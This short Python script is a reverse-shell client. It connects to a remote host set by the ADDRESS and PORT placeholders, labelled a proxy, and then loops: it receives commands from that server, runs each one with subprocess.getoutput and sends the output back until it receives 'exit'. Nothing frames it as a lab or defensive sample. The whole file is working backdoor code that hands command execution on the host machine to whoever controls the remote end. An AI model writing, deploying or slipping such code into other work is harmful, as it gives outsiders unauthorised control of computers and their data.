import socket
import subprocess
import sys

PROXT_HOST = ADDRESS
PROXY_PORT = PORT
BUFFER_SIZE = 1048576


s = socket.socket()
try:
    s.connect((PROXT_HOST, PROXY_PORT))
    print("connecting...")
except:
    print("Failed to connect to proxy")
    sys.exit(0)
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)
while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        print("Lost Connection to Server: Disconnected by User")
        break
    else:
        print(command)
        output = subprocess.getoutput(command)
        s.send(output.encode())
s.close()
